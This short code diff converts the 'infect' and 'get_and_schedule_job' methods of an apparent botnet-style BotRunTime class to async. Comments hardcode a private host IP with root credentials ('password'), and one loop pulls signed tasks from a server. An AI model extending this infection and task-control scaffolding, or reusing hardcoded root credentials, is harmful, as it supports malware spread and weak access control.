@@ -12,7 +12,7 @@ class BotRunTime:
 #host ip:10.142.0.2
 #host username:root
 #host password:password
-    def infect(self):
+    async def infect(self):
         j=0
         while j<1:
             print('infect')
@@ -23,7 +23,7 @@ class BotRunTime:
             j=j+1
             await sleep(settings.INFECTION_CYCLE_TIME)
 
-    def get_and_schedule_job(self):
+    async def get_and_schedule_job(self):
         while True:
             signed_task_description = self.server.get('task')
            # print(signed_task_description)
